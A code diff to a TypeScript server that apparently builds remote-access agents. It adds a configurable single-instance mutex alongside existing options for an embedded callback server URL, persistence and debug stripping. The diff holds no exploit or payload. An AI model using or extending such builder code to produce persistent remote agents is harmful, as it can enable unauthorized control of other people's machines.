@@ -106,6 +106,26 @@ function isAuthorizedAgentRequest(req: Request, url: URL): boolean {
   return isAuthed;
 }
 
+const MUTEX_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
+
+function generateBuildMutex(length = 24): string {
+  const bytes = new Uint8Array(length);
+  crypto.getRandomValues(bytes);
+  return Array.from(bytes)
+    .map((b) => MUTEX_CHARS[b % MUTEX_CHARS.length])
+    .join("");
+}
+
+function sanitizeMutex(value?: string): string | undefined {
+  if (!value) return undefined;
+  const trimmed = value.trim();
+  if (!trimmed) return undefined;
+  if (!/^[A-Za-z0-9._-]{1,64}$/.test(trimmed)) {
+    throw new Error("Mutex must be 1-64 chars using letters, numbers, '.', '_' or '-' only");
+  }
+  return trimmed;
+}
+
 function sanitizeOutputName(name: string): string {
   
   const base = path.basename(name);
@@ -438,6 +458,8 @@ async function startBuildProcess(
     serverUrl?: string;
     customId?: string;
     countryCode?: string;
+    mutex?: string;
+    disableMutex?: boolean;
     stripDebug?: boolean;
     disableCgo?: boolean;
     enablePersistence?: boolean;
@@ -535,6 +557,14 @@ async function startBuildProcess(
       throw new Error("One or more requested platforms are not allowed");
     }
 
+    let buildMutex = "";
+    if (!config.disableMutex) {
+      buildMutex = config.mutex || generateBuildMutex();
+      sendToStream({ type: "output", text: `Mutex: ${buildMutex}\n`, level: "info" });
+    } else {
+      sendToStream({ type: "output", text: "Mutex: disabled\n", level: "info" });
+    }
+
     for (const platform of platformsToBuild) {
       const [os, arch, ...rest] = platform.split("-");
       const goarm = rest[0] === "armv7" ? "7" : undefined;
@@ -563,6 +593,11 @@ async function startBuildProcess(
         const serverFlag = `-X overlord-client/cmd/agent/config.DefaultServerURL=${config.serverUrl}`;
         ldflags = `${ldflags} ${serverFlag}`;
         sendToStream({ type: "output", text: `Server URL: ${config.serverUrl}\n`, level: "info" });
+      }
+
+      if (buildMutex) {
+        const mutexFlag = `-X overlord-client/cmd/agent/config.DefaultMutex=${buildMutex}`;
+        ldflags = ldflags ? `${ldflags} ${mutexFlag}` : mutexFlag;
       }
       
       if (config.enablePersistence) {
@@ -1773,7 +1808,7 @@ async function startServer() {
             requirePermission(user, "clients:control");
             
             const body = await req.json();
-            const { platforms, serverUrl, customId, countryCode, stripDebug, disableCgo, enablePersistence } = body;
+            const { platforms, serverUrl, customId, countryCode, stripDebug, disableCgo, enablePersistence, mutex, disableMutex } = body;
             
             if (!platforms || !Array.isArray(platforms) || platforms.length === 0) {
               return Response.json({ error: "No platforms specified" }, { status: 400 });
@@ -1782,6 +1817,13 @@ async function startServer() {
             
             const safeCustomId = typeof customId === "string" && customId.length <= 64 ? customId : undefined;
             const safeCountry = typeof countryCode === "string" && /^[A-Za-z]{2}$/.test(countryCode) ? countryCode.toUpperCase() : undefined;
+            let safeMutex: string | undefined;
+            try {
+              safeMutex = typeof mutex === "string" ? sanitizeMutex(mutex) : undefined;
+            } catch (err: any) {
+              return Response.json({ error: err?.message || "Invalid mutex" }, { status: 400 });
+            }
+            const safeDisableMutex = !!disableMutex;
             const sanitizedPlatforms = platforms.filter((p: string) => typeof p === "string");
             if (sanitizedPlatforms.length !== platforms.length) {
               return Response.json({ error: "Invalid platform entries" }, { status: 400 });
@@ -1800,7 +1842,7 @@ async function startServer() {
             });
             
             
-            startBuildProcess(buildId, { platforms: sanitizedPlatforms, serverUrl, customId: safeCustomId, countryCode: safeCountry, stripDebug, disableCgo, enablePersistence });
+            startBuildProcess(buildId, { platforms: sanitizedPlatforms, serverUrl, customId: safeCustomId, countryCode: safeCountry, mutex: safeMutex, disableMutex: safeDisableMutex, stripDebug, disableCgo, enablePersistence });
             
             return Response.json({ buildId });
           }
